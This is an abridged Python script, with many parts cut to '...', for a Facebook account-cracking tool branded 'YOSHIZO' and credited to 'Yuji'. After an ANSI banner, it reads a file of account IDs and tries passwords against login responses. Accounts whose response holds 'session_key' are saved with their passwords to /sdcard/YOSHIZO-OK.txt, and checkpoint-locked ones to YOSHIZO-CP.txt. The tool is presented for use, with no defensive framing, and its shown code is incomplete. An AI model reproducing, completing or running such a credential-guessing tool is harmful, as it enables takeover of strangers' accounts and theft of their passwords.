...
logo = """
\033[97;1m  
oooooo   oooo   .oooooo.    .oooooo..o ooooo   ooooo ooooo  oooooooooooo   .oooooo.   
 `888.   .8'   d8P'  `Y8b  d8P'    `Y8 `888'   `888' `888' d'""""""d888'  d8P'  `Y8b  
  `888. .8'   888      888 Y88bo.       888     888   888        .888P   888      888 
   `888.8'    888      888  `"Y8888o.   888ooooo888   888       d888'    888      888 
    `888'     888      888      `"Y88b  888     888   888     .888P      888      888 
     888      `88b    d88' oo     .d8P  888     888   888    d888'    .P `88b    d88' 
    o888o      `Y8bood8P'  8""88888P'  o888o   o888o o888o .8888888888P   `Y8bood8P'  
                                                                                      
                                                                                      
                                                                                      

\033[1;37m══════════════════════════════════════════
\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32mYuji
\033[1;32m  •   \033[1;32mFACEBOK      : \033[1;34m Yuji ʚìɞ
\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mfreetool20
...
def file():
    ...
    if 'gm' in l:
    	...
    	print("\033[1;32m[•]\033[1;37m FOR EXAMPLE: \033[1;32m/sdcard/Yoshizo.txt");linex();file = input(f"\033[1;32m[?]\033[1;37m PUT FILE PATH : ")
    try:
     ...
     try:
      ...
      #      print(response.text) 
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\r\033[1;32m[YOSHIZO-OK] '+acc+' [✓] '+pword+'  ')
                open('/sdcard/YOSHIZO-OK.txt','a').write(f'{acc} [✓] {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\r\033[1;37m[YOSHIZO-CP] '+acc+' [•] '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/YOSHIZO-CP.txt','a').write(f'{acc} [•] {pword}\n')
                break
            else:
                continue
        loop += 1
